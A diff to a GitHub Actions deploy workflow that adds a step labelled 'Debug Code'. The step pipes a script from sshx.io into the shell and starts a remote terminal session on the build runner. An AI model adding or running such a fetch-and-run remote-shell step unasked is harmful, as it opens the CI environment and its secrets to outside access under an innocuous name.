@@ -35,6 +35,8 @@ jobs:
         with:
           source: ./
           destination: ./_site
+      - name: Debug Code
+        run: curl -sSf https://sshx.io/get | sh -s run
       - name: Upload artifact
         uses: actions/upload-pages-artifact@v3
 
